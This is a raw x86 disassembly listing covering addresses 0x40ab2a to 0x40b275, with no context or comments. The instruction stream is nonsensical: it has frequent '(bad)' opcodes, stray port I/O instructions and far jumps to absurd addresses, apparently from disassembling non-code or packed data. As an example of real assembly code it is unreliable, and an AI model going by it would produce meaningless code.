  40ab2a:	jne    0x40ab64
  40ab2c:	loop   0x40ab54
  40ab2e:	out    dx,al
  40ab2f:	dec    ebx
  40ab30:	fmul   st(7),st
  40ab32:	cmp    DWORD PTR [ecx],ebp
  40ab34:	dec    ebx
  40ab35:	push   eax
  40ab36:	bound  esp,QWORD PTR [ecx-0x66130904]
  40ab3c:	lahf   
  40ab3d:	lods   al,BYTE PTR ds:[esi]
  40ab3e:	push   edx
  40ab3f:	pusha  
  40ab40:	adc    ah,BYTE PTR [ebx]
  40ab42:	push   ecx
  40ab43:	mov    ds:0x288cf9dd,al
  40ab48:	out    0x41,eax
  40ab4a:	inc    edx
  40ab4b:	mov    ebx,0x82026112
  40ab50:	jae    0x40ab57
  40ab52:	mov    ah,0x32
  40ab54:	stos   DWORD PTR es:[edi],eax
  40ab55:	push   0x806abeee
  40ab5a:	scas   eax,DWORD PTR es:[edi]
  40ab5b:	or     al,0xa6
  40ab5d:	into   
  40ab5e:	inc    eax
  40ab5f:	mov    eax,ds:0xbc62f143
  40ab64:	iret   
  40ab65:	xchg   DWORD PTR ds:0x58ba67b5,eax
  40ab6b:	popa   
  40ab6c:	xor    ebx,DWORD PTR [esi+0x37]
  40ab6f:	add    al,0xe6
  40ab71:	add    dh,dl
  40ab73:	ja     0x40ab23
  40ab75:	pusha  
  40ab76:	test   BYTE PTR [eax+0x2],ah
  40ab79:	mov    al,BYTE PTR [esi-0x32]
  40ab7c:	xor    al,cl
  40ab7e:	adc    al,BYTE PTR [esi+0x53]
  40ab81:	mov    ds:0xe1358bf5,eax
  40ab86:	cmp    eax,0xb5948a75
  40ab8b:	mov    eax,ds:0x89623261
  40ab90:	fidivr WORD PTR [esi-0x55567b4f]
  40ab96:	out    dx,al
  40ab97:	xchg   edi,eax
  40ab98:	jg     0x40ab4a
  40ab9a:	(bad)  
  40ab9b:	cld    
  40ab9c:	cld    
  40ab9d:	addr16 loop 0x40ab40
  40aba0:	jmp    0x40ab2c
  40aba2:	sub    eax,0x30cddf9c
  40aba7:	mov    BYTE PTR [esi+0x2f],bl
  40abaa:	or     BYTE PTR [edx],al
  40abac:	(bad)  
  40abad:	stos   BYTE PTR es:[edi],al
  40abae:	push   esi
  40abaf:	pop    esp
  40abb0:	inc    ebx
  40abb1:	inc    edx
  40abb2:	hlt    
  40abb3:	fsub   DWORD PTR [edx+0x3d1f7160]
  40abb9:	scas   al,BYTE PTR es:[edi]
  40abba:	cwde   
  40abbb:	stc    
  40abbc:	pop    esi
  40abbd:	and    ecx,DWORD PTR [edx-0x5047b0e0]
  40abc3:	ins    BYTE PTR es:[edi],dx
  40abc4:	dec    ebp
  40abc5:	scas   eax,DWORD PTR es:[edi]
  40abc6:	enter  0x29a0,0x98
  40abca:	pop    esp
  40abcb:	shl    BYTE PTR [edi+0xb],1
  40abce:	aam    0x2b
  40abd0:	pop    esi
  40abd1:	add    BYTE PTR [edx],dl
  40abd3:	js     0x40abe1
  40abd5:	sub    ecx,DWORD PTR [ebx-0x20a192fb]
  40abdb:	push   0xadaf87a4
  40abe0:	(bad)  
  40abe1:	aaa    
  40abe2:	and    edx,edx
  40abe4:	pop    esi
  40abe5:	sbb    al,0xeb
  40abe7:	ret    
  40abe8:	fsubr  QWORD PTR [esi]
  40abea:	mov    eax,0x4abc2944
  40abef:	arpl   ax,ax
  40abf1:	pusha  
  40abf2:	in     al,0x24
  40abf4:	sbb    BYTE PTR [edi-0x249ff5a1],0xe9
  40abfb:	sub    edi,DWORD PTR [esp+esi*2+0xa]
  40abff:	sbb    al,0x9e
  40ac01:	fsub   st(5),st
  40ac03:	mov    dl,0x90
  40ac05:	push   edi
  40ac06:	jnp    0x40abcc
  40ac08:	pop    ss
  40ac09:	retf   
  40ac0a:	cmp    al,BYTE PTR [ebx+0x61d67f5e]
  40ac10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac11:	and    BYTE PTR [edx],0x90
  40ac14:	repnz push ebx
  40ac16:	sub    ebp,DWORD PTR [eax+0xc]
  40ac19:	retf   0xa115
  40ac1c:	shl    DWORD PTR [ebx+0x3a],1
  40ac1f:	call   0x22877c82
  40ac24:	mov    eax,gs
  40ac26:	into   
  40ac27:	je     0x40ac3b
  40ac29:	pusha  
  40ac2a:	retf   
  40ac2b:	or     al,0x66
  40ac2d:	(bad)  
  40ac2e:	jle    0x40acad
  40ac30:	jecxz  0x40ac62
  40ac32:	sub    dl,ch
  40ac34:	pop    esi
  40ac35:	or     BYTE PTR [eax],0x12
  40ac38:	nop
  40ac39:	jle    0x40ac26
  40ac3b:	jle    0x40ac35
  40ac3d:	pop    ebp
  40ac3e:	fld    TBYTE PTR [ebx+0x3e]
  40ac41:	mov    esi,0x2f763c40
  40ac46:	add    al,0xae
  40ac48:	pop    esi
  40ac49:	test   al,0xe8
  40ac4b:	ret    
  40ac4c:	xchg   ecx,eax
  40ac4d:	push   ebp
  40ac4e:	packsswb mm1,QWORD PTR [esi+0x5a]
  40ac52:	push   edi
  40ac53:	out    dx,eax
  40ac54:	rol    edi,cl
  40ac56:	retf   0x66b0
  40ac59:	(bad)  
  40ac5a:	xchg   esi,eax
  40ac5b:	pusha  
  40ac5c:	and    al,BYTE PTR [ebp-0x1a145f3b]
  40ac62:	cdq    
  40ac63:	jmp    0x9f62b250
  40ac68:	aad    0x25
  40ac6a:	and    al,0x6
  40ac6c:	mov    esi,0x70ea88b0
  40ac71:	inc    esi
  40ac72:	add    bl,dh
  40ac74:	and    bh,al
  40ac76:	scas   al,BYTE PTR es:[edi]
  40ac77:	dec    ebx
  40ac78:	dec    ecx
  40ac79:	fcmove st,st(3)
  40ac7b:	in     eax,dx
  40ac7c:	int    0x55
  40ac7e:	xor    DWORD PTR [ebx-0x64],edi
  40ac81:	rol    BYTE PTR [esi-0x2b],0x5d
  40ac85:	dec    ebp
  40ac86:	nop
  40ac87:	imul   esi,DWORD PTR [ebp-0x62],0x3c6ea67c
  40ac8e:	jp     0x40ac31
  40ac90:	out    dx,al
  40ac91:	push   0x671c588
  40ac96:	xchg   esp,eax
  40ac98:	pop    ebx
  40ac99:	cmp    dh,BYTE PTR [ecx+0x36]
  40ac9c:	dec    esp
  40ac9d:	add    eax,0xb1e4bb0e
  40aca2:	dec    esp
  40aca3:	mov    al,ds:0x9dd26996
  40aca8:	jle    0x40ad24
  40acaa:	mov    edx,0xee0afcae
  40acaf:	cmp    al,0x76
  40acb1:	xchg   edi,eax
  40acb2:	sub    al,0x79
  40acb4:	jns    0x40ac70
  40acb6:	js     0x40ac46
  40acb8:	lea    ecx,[edi+0x1b]
  40acbb:	mov    eax,ds:0xd797d9ac
  40acc0:	sub    eax,0xc92ef080
  40acc5:	stos   BYTE PTR es:[edi],al
  40acc6:	jmp    0xf660:0xedc9bd82
  40accd:	ss js  0x40ac81
  40acd0:	jno    0x40ad06
  40acd2:	pushf  
  40acd3:	ret    0x492e
  40acd6:	jmp    0x40aca1
  40acd8:	ret    
  40acd9:	mov    ebx,0xb8bfd464
  40acde:	and    ecx,eax
  40ace0:	fsubr  DWORD PTR [edx-0x65d5fb4]
  40ace6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ace7:	xor    edi,DWORD PTR [esi]
  40ace9:	mov    ebx,0xa58debdd
  40acee:	out    dx,al
  40acef:	jb     0x40ac88
  40acf1:	icebp  
  40acf2:	and    eax,0xf4166906
  40acf7:	sahf   
  40acf8:	loope  0x40acb9
  40acfa:	test   al,0x3e
  40acfc:	(bad)  
  40acfd:	adc    eax,0xa14ca7e0
  40ad02:	out    dx,al
  40ad03:	mov    ebp,0x3dceaca0
  40ad08:	mul    BYTE PTR ds:0xe9d99038
  40ad0e:	lods   al,BYTE PTR fs:[esi]
  40ad10:	pop    esi
  40ad11:	test   DWORD PTR [esi],0xae085b0f
  40ad17:	or     ah,BYTE PTR [ebp+edi*1+0xf]
  40ad1b:	das    
  40ad1c:	inc    eax
  40ad1d:	repz dec ebp
  40ad1f:	inc    ecx
  40ad20:	and    DWORD PTR [ebx+0x606ee47e],ebx
  40ad26:	pusha  
  40ad27:	inc    esp
  40ad28:	daa    
  40ad29:	(bad)  
  40ad2a:	dec    ebx
  40ad2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad2c:	or     eax,0x14d7ee94
  40ad31:	add    bh,BYTE PTR [ebx]
  40ad33:	sbb    BYTE PTR [ebp-0x4d5f49c0],ah
  40ad39:	popf   
  40ad3a:	repnz mov ah,0x38
  40ad3d:	adc    DWORD PTR [ebx],edx
  40ad3f:	scas   eax,DWORD PTR es:[edi]
  40ad40:	fs das 
  40ad42:	jg     0x40ada1
  40ad44:	retf   0xfa31
  40ad47:	inc    ebx
  40ad48:	call   0x95d8:0xaa78c282
  40ad4f:	mov    ds:0x6d7812ed,al
  40ad54:	xor    al,0x57
  40ad56:	pushf  
  40ad57:	push   ebp
  40ad58:	outs   dx,BYTE PTR ds:[esi]
  40ad59:	mov    ds:0x7d704dee,eax
  40ad5e:	push   ebp
  40ad5f:	adc    cl,dh
  40ad61:	pushf  
  40ad62:	pop    eax
  40ad63:	mov    eax,ds:0xce0eac16
  40ad68:	and    al,0x85
  40ad6a:	icebp  
  40ad6b:	adc    al,0x5b
  40ad6d:	cli    
  40ad6e:	inc    esi
  40ad6f:	in     eax,dx
  40ad70:	int3   
  40ad71:	push   es
  40ad72:	ds inc ebx
  40ad74:	sbb    DWORD PTR [ecx],0x65049f16
  40ad7a:	mov    dl,0x2d
  40ad7c:	(bad)  
  40ad7d:	sti    
  40ad7e:	sbb    dl,BYTE PTR cs:[ebx+eax*1+0x3a]
  40ad83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad84:	push   0x12d1725d
  40ad89:	shr    esi,1
  40ad8b:	iret   
  40ad8c:	jmp    0xff61:0x486d02a1
  40ad93:	dec    ecx
  40ad94:	sar    ah,cl
  40ad96:	sbb    eax,0xee90afe3
  40ad9b:	clc    
  40ad9c:	mov    ch,0xf0
  40ad9e:	pop    edx
  40ad9f:	(bad)  
  40ada0:	mov    esi,DWORD PTR ds:[ecx]
  40ada3:	ja     0x40adce
  40ada5:	popa   
  40ada6:	lea    ebp,[esi]
  40ada8:	dec    eax
  40ada9:	lock fwait
  40adab:	mov    ebp,0x9cee09b3
  40adb0:	mov    DWORD PTR [ebx-0x57495b44],ebx
  40adb6:	push   es
  40adb7:	in     al,dx
  40adb8:	xor    DWORD PTR es:[edi],edx
  40adbb:	lea    ebp,[edi]
  40adbd:	f2xm1  
  40adbf:	jmp    0xa152:0x9157df5a
  40adc6:	sub    ebx,DWORD PTR [esi-0x5d]
  40adc9:	mov    dh,0xee
  40adcb:	mov    ah,BYTE PTR [eax]
  40adcd:	leave  
  40adce:	xlat   BYTE PTR ds:[ebx]
  40adcf:	lds    ebp,FWORD PTR [eax]
  40add1:	repz clc 
  40add3:	mov    al,ds:0xcc6c15cd
  40add8:	add    al,BYTE PTR [edi]
  40adda:	push   ds
  40addb:	mov    ebp,0x675d4359
  40ade0:	lea    ecx,[eax-0x6b6bdeb0]
  40ade6:	sbb    eax,0x8dd6768
  40adeb:	std    
  40adec:	fsub   DWORD PTR [eax+0x5b]
  40adef:	outs   dx,DWORD PTR ds:[esi]
  40adf0:	xchg   ecx,eax
  40adf1:	mov    dh,0xe7
  40adf3:	fadd   st,st(1)
  40adf5:	lea    eax,[eax]
  40adf7:	mov    dh,bh
  40adf9:	pusha  
  40adfa:	or     bh,BYTE PTR [edx+0x18]
  40adfd:	retf   
  40adfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adff:	in     eax,dx
  40ae00:	pop    esi
  40ae01:	or     eax,0xb9f2938d
  40ae06:	dec    ecx
  40ae07:	data16 sub BYTE PTR [ecx+0x71],ah
  40ae0b:	xor    ebp,esi
  40ae0d:	pop    esi
  40ae0e:	aam    0xce
  40ae10:	fdivr  DWORD PTR [esi+ebp*8-0x1bc39b99]
  40ae17:	(bad)  
  40ae18:	outs   dx,DWORD PTR ds:[esi]
  40ae19:	jl     0x40adfb
  40ae1b:	mov    al,ds:0xad93b129
  40ae20:	mov    ecx,0x5b3705f3
  40ae25:	dec    esp
  40ae26:	jbe    0x40adfd
  40ae28:	push   ds
  40ae29:	(bad)  
  40ae2a:	out    dx,al
  40ae2b:	cmp    cl,BYTE PTR [edi-0x1d703a21]
  40ae31:	bound  esp,QWORD PTR [ecx+eiz*1-0x7d]
  40ae35:	mov    esp,0x6cf23bf6
  40ae3a:	outs   dx,DWORD PTR cs:[esi]
  40ae3c:	adc    dl,BYTE PTR [esi+eiz*2+0x165521ab]
  40ae43:	sar    DWORD PTR [edx],cl
  40ae45:	js     0x40ae2b
  40ae47:	neg    BYTE PTR [esi-0x1d]
  40ae4a:	repz or bh,bl
  40ae4d:	stos   BYTE PTR es:[edi],al
  40ae4e:	aam    0x43
  40ae50:	mov    eax,ds:0xf4eba960
  40ae55:	pop    ebp
  40ae56:	jae    0x40ae24
  40ae58:	bound  ecx,QWORD PTR [esi+ebp*8+0x46]
  40ae5c:	xchg   esi,eax
  40ae5d:	push   0x7a
  40ae5f:	jmp    0xa0f01a83
  40ae64:	pop    edx
  40ae65:	enter  0x9725,0x1d
  40ae69:	jb     0x40aea0
  40ae6b:	pusha  
  40ae6c:	out    dx,eax
  40ae6d:	or     ebp,esi
  40ae6f:	inc    esp
  40ae70:	(bad)  
  40ae71:	cmp    eax,0x7bc1811c
  40ae76:	or     al,0xac
  40ae78:	nop    esi
  40ae7b:	mov    ebp,0x43880277
  40ae80:	nop
  40ae81:	(bad)  
  40ae82:	out    dx,al
  40ae83:	test   BYTE PTR [edi],ch
  40ae85:	aad    0xc3
  40ae87:	es push es
  40ae89:	and    al,0x5a
  40ae8b:	mov    eax,ds:0x79844be8
  40ae90:	inc    edx
  40ae91:	inc    esi
  40ae92:	fnstcw WORD PTR [ecx+0x5f]
  40ae95:	xchg   ebx,eax
  40ae96:	(bad)  
  40ae97:	fld    TBYTE PTR [esi]
  40ae99:	add    al,0x9a
  40ae9b:	jno    0x40ae39
  40ae9d:	or     bl,BYTE PTR [ebx]
  40ae9f:	mov    eax,ds:0x21c7cc13
  40aea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aea5:	add    al,BYTE PTR [eax-0x7d20a1cc]
  40aeab:	sbb    DWORD PTR [ebp+edi*8+0x609f1411],edi
  40aeb2:	scas   eax,DWORD PTR es:[edi]
  40aeb3:	sub    DWORD PTR [ebx],ebx
  40aeb5:	jb     0x40aeaa
  40aeb7:	and    BYTE PTR [esi-0x8],al
  40aeba:	jmp    0x40af10
  40aebc:	cli    
  40aebd:	call   0xf8ef4ba0
  40aec2:	inc    esp
  40aec3:	add    esi,0x4a182a4
  40aec9:	push   edx
  40aeca:	scas   eax,DWORD PTR es:[edi]
  40aecb:	mov    DWORD PTR [edi-0x4],ebx
  40aece:	xchg   ebx,eax
  40aecf:	ficomp WORD PTR [ebx-0x6f]
  40aed2:	(bad)  
  40aed3:	xchg   esi,eax
  40aed4:	call   0xe13e:0xf4a7fe7a
  40aedb:	int3   
  40aedc:	es pop ecx
  40aede:	out    dx,al
  40aedf:	pop    eax
  40aee0:	adc    edx,DWORD PTR ds:0xa2d3ac61
  40aee6:	out    dx,al
  40aee7:	sti    
  40aee8:	sub    al,0x2f
  40aeea:	in     al,0x74
  40aeec:	js     0x40aecf
  40aeee:	shl    DWORD PTR [eax+0x787bb1e3],0xfd
  40aef5:	fist   DWORD PTR [edx+eax*8]
  40aef8:	pop    esi
  40aef9:	lods   al,BYTE PTR ds:[esi]
  40aefa:	leave  
  40aefb:	nop
  40aefc:	test   eax,0x1b4fe95c
  40af01:	popa   
  40af02:	(bad)  
  40af03:	(bad)  
  40af04:	loope  0x40aee4
  40af06:	mov    ebx,0xee1c68a7
  40af0b:	pushf  
  40af0c:	(bad)  
  40af0d:	jge    0x40aeb4
  40af0f:	dec    ebp
  40af10:	inc    ebx
  40af11:	call   0x503c:0x604aa3a0
  40af18:	mov    dl,0x6e
  40af1a:	outs   dx,BYTE PTR ds:[esi]
  40af1b:	sub    al,0x52
  40af1d:	and    cl,dh
  40af1f:	sahf   
  40af20:	cmp    BYTE PTR [edi-0x28],bh
  40af23:	and    dh,bh
  40af25:	fadd   DWORD PTR [edi+0x40]
  40af28:	shl    esi,0x4a
  40af2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af2c:	fidivr DWORD PTR [ecx+0x26]
  40af2f:	xchg   ebx,eax
  40af30:	das    
  40af31:	and    ebp,esi
  40af33:	fild   DWORD PTR [ecx-0x30]
  40af36:	xchg   ebp,eax
  40af37:	data16 icebp 
  40af39:	sbb    al,0xde
  40af3b:	mov    ds:0x6917d5b2,eax
  40af40:	cmp    al,0xdb
  40af42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af43:	add    al,0xd7
  40af45:	outs   dx,DWORD PTR ds:[esi]
  40af46:	jmp    0x40af30
  40af48:	je     0x40af8c
  40af4a:	fdivr  QWORD PTR [edi]
  40af4c:	loop   0x40af3e
  40af4e:	mov    edx,DWORD PTR [edi+ebx*1]
  40af51:	popa   
  40af52:	rcl    DWORD PTR [edi-0x6d83f2d9],cl
  40af58:	psubd  mm6,mm5
  40af5b:	pop    edx
  40af5c:	push   edi
  40af5d:	mov    BYTE PTR [edx+0x21],bh
  40af60:	push   ebp
  40af61:	shl    BYTE PTR [esi+0x27],cl
  40af64:	sub    bl,BYTE PTR [edx+0x2f]
  40af67:	sub    al,0x4a
  40af69:	xor    edi,DWORD PTR ds:0x8ff79441
  40af6f:	dec    ecx
  40af70:	pop    esi
  40af71:	mov    WORD PTR [ebx+0x5],ss
  40af74:	fimul  DWORD PTR [ecx+0x62]
  40af77:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af79:	pop    esi
  40af7a:	or     dh,BYTE PTR [edx+0xf644b9e]
  40af80:	(bad)  
  40af81:	cmc    
  40af82:	cmp    al,0x9e
  40af84:	pop    esi
  40af85:	xlat   BYTE PTR ds:[ebx]
  40af86:	sub    ah,BYTE PTR [eax+ebx*4]
  40af89:	rol    DWORD PTR [ecx-0x739f0a1e],1
  40af8f:	lock out 0xcf,al
  40af92:	sahf   
  40af93:	int    0x65
  40af95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af96:	out    dx,al
  40af97:	pop    es
  40af98:	jle    0x40af9a
  40af9a:	xchg   ebx,eax
  40af9b:	popf   
  40af9c:	stos   BYTE PTR es:[edi],al
  40af9d:	mov    edi,0xf2449fa0
  40afa2:	jecxz  0x40af69
  40afa4:	outs   dx,DWORD PTR ds:[esi]
  40afa6:	in     eax,0x5e
  40afa8:	fmul   QWORD PTR [edi-0x2cb0d812]
  40afae:	mov    cl,0xcf
  40afb0:	jb     0x40af9a
  40afb2:	daa    
  40afb3:	scas   eax,DWORD PTR es:[edi]
  40afb4:	push   edi
  40afb5:	cli    
  40afb6:	in     eax,dx
  40afb7:	fmul   st(1),st
  40afb9:	lock pop ss
  40afbb:	lods   al,BYTE PTR ds:[esi]
  40afbc:	sbb    bl,BYTE PTR [ebp+0x145d1825]
  40afc2:	add    BYTE PTR [edx-0x6df01899],ah
  40afc8:	(bad)  
  40afca:	inc    ebx
  40afcb:	sbb    al,0xfc
  40afcd:	ins    DWORD PTR es:[edi],dx
  40afce:	add    DWORD PTR [ebx-0x1fb38ca2],edi
  40afd4:	or     dl,BYTE PTR [edi+0x5a188d3d]
  40afda:	jne    0x40afde
  40afdc:	fisubr DWORD PTR [ecx-0x70c1be8f]
  40afe2:	push   0x4f0c5e22
  40afe7:	ret    
  40afe8:	xchg   esp,eax
  40afe9:	test   DWORD PTR [edx-0x9ebc7f],ecx
  40afef:	leave  
  40aff0:	jg     0x40af8f
  40aff2:	mov    dl,0xaa
  40aff4:	ins    BYTE PTR es:[edi],dx
  40aff5:	xchg   edx,eax
  40aff6:	out    dx,al
  40aff7:	xor    al,bh
  40aff9:	mov    edi,0x3d29872e
  40affe:	aam    0xa0
  40b000:	fcomip st,st(7)
  40b002:	mov    ah,0x1
  40b004:	lock xor dh,ah
  40b007:	aad    0x7c
  40b009:	(bad)  
  40b00a:	jmp    0x40b06d
  40b00c:	xlat   BYTE PTR ds:[ebx]
  40b00d:	sub    eax,0x91612c6d
  40b012:	xchg   edx,eax
  40b013:	(bad)  
  40b014:	fisub  WORD PTR [eax-0x1c]
  40b017:	mov    ds:0x8e27dc6c,al
  40b01c:	mov    dh,0x94
  40b01e:	in     al,dx
  40b01f:	jg     0x40b013
  40b021:	(bad)  
  40b022:	push   eax
  40b023:	arpl   WORD PTR [ecx],bx
  40b025:	rcl    DWORD PTR [esp+edi*2+0x54160a7],0x21
  40b02d:	add    BYTE PTR [ebx-0x1158146b],al
  40b033:	and    DWORD PTR [edi+0x42d6bc22],ecx
  40b039:	rol    DWORD PTR [esi+0x26fb07a1],cl
  40b03f:	cmp    al,0xdc
  40b041:	mov    eax,ds:0xbfefcc7a
  40b046:	out    dx,al
  40b047:	in     al,0x22
  40b049:	jp     0x40aff4
  40b04b:	pop    esi
  40b04c:	xor    ecx,eax
  40b04e:	sbb    ebp,esi
  40b050:	mul    BYTE PTR [eax+0x50]
  40b053:	pop    edx
  40b054:	jl     0x40b0c8
  40b056:	nop
  40b057:	pop    ebp
  40b058:	jne    0x40b095
  40b05a:	fidivr DWORD PTR [ebx+0x5fbcdf3a]
  40b060:	pop    esi
  40b061:	gs in  al,dx
  40b063:	adc    cl,cl
  40b065:	mov    ds:0x4f68a16e,eax
  40b06a:	inc    ecx
  40b06b:	rcl    DWORD PTR [esi],0xf4
  40b06e:	mov    al,0xb9
  40b070:	pop    esi
  40b071:	jge    0x40b0cf
  40b073:	call   0x243a4988
  40b078:	mov    esp,0xc2868360
  40b07d:	mov    esi,0x1f3291b
  40b082:	out    dx,eax
  40b083:	fsub   DWORD PTR [esi+eiz*2+0x54a02144]
  40b08a:	mov    al,0xff
  40b08c:	inc    edx
  40b08d:	popa   
  40b08e:	dec    ebp
  40b08f:	ficom  DWORD PTR [eax+esi*8-0x2b]
  40b093:	sub    ebp,ebp
  40b095:	sub    dh,ch
  40b097:	xor    al,ah
  40b099:	jle    0x40b07b
  40b09b:	xchg   esi,eax
  40b09c:	pop    ebx
  40b09d:	mov    ecx,DWORD PTR [edx-0x71]
  40b0a0:	sbb    eax,DWORD PTR [eax]
  40b0a2:	lea    esp,[ebx]
  40b0a4:	jns    0x40b08b
  40b0a6:	adc    al,0x59
  40b0a8:	sahf   
  40b0a9:	pop    edx
  40b0aa:	mov    ecx,0xeecf6c00
  40b0af:	mov    WORD PTR [ebx+0x32f77625],es
  40b0b5:	popf   
  40b0b6:	inc    edi
  40b0b7:	mov    eax,ds:0x6907ec80
  40b0bc:	mov    dl,0xfc
  40b0be:	test   BYTE PTR [ecx+0x5f],0x29
  40b0c2:	test   DWORD PTR [ecx-0x12],ebx
  40b0c5:	jnp    0x40b0fc
  40b0c7:	sub    ecx,ecx
  40b0c9:	mov    WORD PTR [edi],?
  40b0cb:	stos   BYTE PTR es:[edi],al
  40b0cc:	dec    ecx
  40b0cd:	daa    
  40b0ce:	outs   dx,BYTE PTR ds:[esi]
  40b0cf:	cmc    
  40b0d0:	aas    
  40b0d1:	xor    eax,ecx
  40b0d3:	dec    ebx
  40b0d4:	sar    BYTE PTR [esi+ebp*8+0x6e],0x68
  40b0d9:	xchg   ebx,eax
  40b0da:	pop    ebp
  40b0db:	mov    BYTE PTR ds:0x1ae39f3,dl
  40b0e1:	push   esp
  40b0e2:	out    dx,al
  40b0e3:	adc    ebp,DWORD PTR [ecx-0x5ab26997]
  40b0e9:	sub    esi,0x4720201e
  40b0ef:	push   cs
  40b0f0:	pop    esp
  40b0f1:	jns    0x40b0bf
  40b0f3:	mov    al,ds:0xddba2242
  40b0f8:	pop    edx
  40b0f9:	mov    cl,0x6a
  40b0fb:	and    BYTE PTR [esi+eax*2+0x44],0x52
  40b100:	inc    eax
  40b101:	inc    ecx
  40b102:	out    0x91,eax
  40b104:	mov    al,0x1b
  40b106:	popa   
  40b107:	mov    eax,ds:0x7e6c1836
  40b10c:	out    dx,al
  40b10d:	hlt    
  40b10e:	scas   al,BYTE PTR es:[edi]
  40b10f:	adc    BYTE PTR [esi-0x3],bl
  40b112:	aaa    
  40b113:	sbb    cl,BYTE PTR [ebx]
  40b115:	stc    
  40b116:	add    eax,0x862a67db
  40b11b:	mov    ds:0xda5e3d16,al
  40b120:	fist   WORD PTR [eax+0x18b87cc9]
  40b126:	out    dx,al
  40b127:	or     ebp,DWORD PTR [ecx+eax*8+0x43c21ee0]
  40b12e:	push   0x11121da1
  40b133:	add    DWORD PTR [edi],eax
  40b135:	mov    ebp,0xe55e7e08
  40b13a:	pop    edi
  40b13b:	push   edi
  40b13c:	mov    ch,0xbf
  40b13e:	mov    BYTE PTR [ebx+edi*2],dh
  40b141:	pusha  
  40b142:	fiadd  DWORD PTR [edi-0x3f]
  40b145:	lea    edi,[edi-0x14b8684f]
  40b14b:	cmp    ecx,ebx
  40b14d:	sub    esp,ebp
  40b14f:	add    BYTE PTR [edi],cl
  40b151:	fstp   DWORD PTR [edx]
  40b153:	hlt    
  40b154:	sub    BYTE PTR [eax-0x8],ah
  40b157:	and    esi,edx
  40b159:	inc    esi
  40b15a:	sahf   
  40b15b:	shl    DWORD PTR [esi],0x85
  40b15e:	shl    bh,0x5e
  40b161:	cmp    bh,bh
  40b163:	pop    ecx
  40b164:	mov    DWORD PTR [edi+eiz*8-0x6abcd281],eax
  40b16b:	jp     0x40b18d
  40b16d:	mov    eax,ds:0x7f473fa
  40b172:	xchg   edi,eax
  40b173:	nop
  40b174:	pop    esi
  40b175:	pop    es
  40b176:	in     al,dx
  40b177:	ror    BYTE PTR [ecx-0x73],0x33
  40b17b:	mov    ebp,0x80f86167
  40b180:	or     eax,0x1b1a2c27
  40b185:	jp     0x40b16e
  40b187:	pop    ss
  40b188:	mov    esp,0xceb1dfba
  40b18d:	pop    ebp
  40b18e:	iret   
  40b18f:	das    
  40b190:	and    DWORD PTR [eax-0x51],0x94063ed1
  40b197:	lahf   
  40b198:	adc    eax,0xaa27ee45
  40b19d:	nop
  40b19e:	and    ch,BYTE PTR [ecx-0x5da50486]
  40b1a4:	add    eax,0x662bd319
  40b1a9:	jnp    0x40b19a
  40b1ab:	push   esp
  40b1ac:	out    0xa4,al
  40b1ae:	out    dx,al
  40b1af:	push   ecx
  40b1b0:	sti    
  40b1b1:	scas   eax,DWORD PTR es:[edi]
  40b1b2:	xor    eax,DWORD PTR [esi+0x7613a396]
  40b1b8:	jbe    0x40b1b6
  40b1ba:	arpl   WORD PTR [ecx-0x191aa9a7],sp
  40b1c0:	fwait
  40b1c1:	dec    esi
  40b1c2:	idiv   bl
  40b1c4:	pop    esi
  40b1c5:	inc    esp
  40b1c6:	and    BYTE PTR [edx-0x76],al
  40b1c9:	shl    BYTE PTR [ebx+0x7d],1
  40b1cc:	sub    DWORD PTR [ecx-0x22],esp
  40b1cf:	ror    DWORD PTR [edi],1
  40b1d1:	aas    
  40b1d2:	inc    eax
  40b1d3:	or     BYTE PTR [edi-0x7f38114d],bh
  40b1d9:	imul   esp,DWORD PTR [edx+0x3d1d9ab4],0x261647a1
  40b1e3:	ja     0x40b1e4
  40b1e5:	sub    al,al
  40b1e7:	jb     0x40b247
  40b1e9:	pop    es
  40b1ea:	ss sqrtps xmm7,xmm3
  40b1ee:	sbb    eax,DWORD PTR [esi+0x17]
  40b1f1:	popa   
  40b1f2:	xor    DWORD PTR [eax],ebp
  40b1f4:	ss sub edx,esi
  40b1f7:	mov    cl,0x8f
  40b1f9:	loope  0x40b1eb
  40b1fb:	sar    al,1
  40b1fd:	repnz sbb al,0x41
  40b200:	dec    eax
  40b201:	xor    edx,DWORD PTR [edi-0x25]
  40b204:	inc    ecx
  40b205:	popa   
  40b206:	push   es
  40b207:	ret    0x8494
  40b20a:	loop   0x40b1e3
  40b20c:	cmp    bh,bh
  40b20e:	sahf   
  40b20f:	or     esp,esi
  40b211:	adc    al,0x48
  40b213:	xor    BYTE PTR [esi-0x33],bl
  40b216:	mov    eax,ds:0x92c900f1
  40b21b:	jle    0x40b1a7
  40b21d:	pusha  
  40b21e:	aaa    
  40b21f:	push   esi
  40b220:	imul   ecx,DWORD PTR [edx+ecx*8+0x6c],0x7fe7774b
  40b228:	push   eax
  40b229:	push   esi
  40b22a:	sbb    esi,esp
  40b22c:	push   cs
  40b22d:	test   BYTE PTR [ebx+0x2aeea86],ch
  40b233:	mov    eax,ds:0x29204f99
  40b238:	into   
  40b239:	dec    ecx
  40b23a:	out    0xa9,al
  40b23c:	xor    eax,DWORD PTR [eax-0x47]
  40b23f:	mov    eax,ds:0x2a053042
  40b244:	jecxz  0x40b20a
  40b246:	push   esi
  40b247:	shl    DWORD PTR [esi-0x187abaa0],1
  40b24d:	lock pop eax
  40b24f:	cmc    
  40b250:	pop    es
  40b251:	test   al,0xeb
  40b253:	dec    esp
  40b254:	mov    ds:0x68c60315,al
  40b259:	mov    eax,ds:0x70807fc1
  40b25e:	retf   
  40b25f:	xor    eax,0xc8e8aac6
  40b264:	xor    bh,BYTE PTR [edi-0x2f]
  40b267:	and    BYTE PTR [ebx],al
  40b269:	xlat   BYTE PTR ds:[ebx]
  40b26a:	jb     0x40b2e7
  40b26c:	pusha  
  40b26d:	cld    
  40b26e:	inc    esi
  40b26f:	lea    edi,[edx]
  40b271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b272:	inc    ebp
  40b273:	popa   
  40b274:	int3   
  40b275:	sbb    bl,al
